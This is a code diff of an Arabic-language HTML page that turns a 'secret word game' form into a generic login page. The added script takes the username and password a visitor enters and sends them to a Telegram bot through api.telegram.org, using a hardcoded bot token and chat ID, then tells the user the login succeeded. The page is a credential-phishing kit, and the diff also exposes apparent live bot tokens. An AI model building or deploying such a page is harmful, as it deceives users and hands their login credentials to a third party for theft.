@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لعبة الكلمات السرية</title>
+    <title>صفحة تسجيل الدخول</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,7 +14,7 @@
             height: 100vh;
             margin: 0;
         }
-        .game-container {
+        .login-container {
             background-color: white;
             padding: 20px;
             border-radius: 5px;
@@ -43,22 +43,28 @@
     </style>
 </head>
 <body>
-    <div class="game-container">
-        <h1>لعبة الكلمات السرية</h1>
-        <p>أدخل كلمة المرور السرية للمستوى التالي:</p>
-        <form id="gameForm">
-            <input type="text" id="secretWord" placeholder="الكلمة السرية" required>
-            <button type="submit">تحقق</button>
+    <div class="login-container">
+        <h1>تسجيل الدخول</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="اسم المستخدم" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
         </form>
         <p id="result"></p>
     </div>
+    
     <script>
-        const BOT_TOKEN = '6427937623:AAEXzSsiAIy67dxzI0gqR9Dyuc59iGFSfmM'; // استبدل هذا بتوكن البوت الخاص بك
+        const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // توكن البوت الخاص بك
+        const CHAT_ID = '7072093078'; // معرف الدردشة الخاص بك
 
-        document.getElementById('gameForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            var secretWord = document.getElementById('secretWord').value;
+            
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
             var result = document.getElementById('result');
+            
+            var message = `🟢 بيانات تسجيل دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
             
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -66,17 +72,17 @@
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    chat_id: 'YOUR_CHAT_ID', // استبدل هذا بمعرف الدردشة الخاص بك لاحقًا
-                    text: 'كلمة سرية جديدة: ' + secretWord
+                    chat_id: CHAT_ID,
+                    text: message
                 }),
             })
             .then(response => response.json())
             .then(data => {
-                result.textContent = "تم إرسال الكلمة! انتظر الرد من المشرف على اللعبة.";
+                result.textContent = "تم إرسال البيانات! شكراً لتسجيل الدخول.";
             })
             .catch((error) => {
                 console.error('Error:', error);
-                result.textContent = "حدث خطأ أثناء إرسال الكلمة. حاول مرة أخرى.";
+                result.textContent = "حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.";
             });
         });
     </script>
